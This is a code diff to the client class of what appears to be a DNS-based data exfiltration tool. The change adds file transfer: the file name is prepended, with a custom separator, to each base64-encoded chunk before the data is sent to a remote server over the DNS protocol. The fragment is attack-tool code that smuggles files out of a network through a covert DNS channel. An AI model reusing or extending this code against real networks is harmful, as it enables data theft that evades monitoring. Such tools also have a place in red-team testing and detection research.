@@ -18,8 +18,16 @@ class Client:
 
     def __init__(self, cli_object):
         self.protocol = "dns"
-        self.length = 35
         self.remote_server = cli_object.ip
+        if cli_object.file is None:
+            self.file_transfer = False
+            self.length = 35
+        else:
+            self.length = 14
+            if "/" in cli_object.file:
+                self.file_transfer = cli_object.file.split("/")[-1]
+            else:
+                self.file_transfer = cli_object.file
 
     def transmit(self, data_to_transmit):
 
@@ -34,7 +42,11 @@ class Client:
             final_destination = socket.gethostbyname(self.remote_server)
 
         while (byte_reader < len(data_to_transmit) + self.length):
-            encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
+            if not self.file_transfer:
+                encoded_data = base64.b64encode(data_to_transmit[byte_reader:byte_reader + self.length])
+            else:
+                encoded_data = base64.b64encode(self.file_transfer +
+                    ".:::-989-:::." + data_to_transmit[byte_reader:byte_reader + self.length])
 
             # calcalate total packets
             if ((len(data_to_transmit) % self.length) == 0):
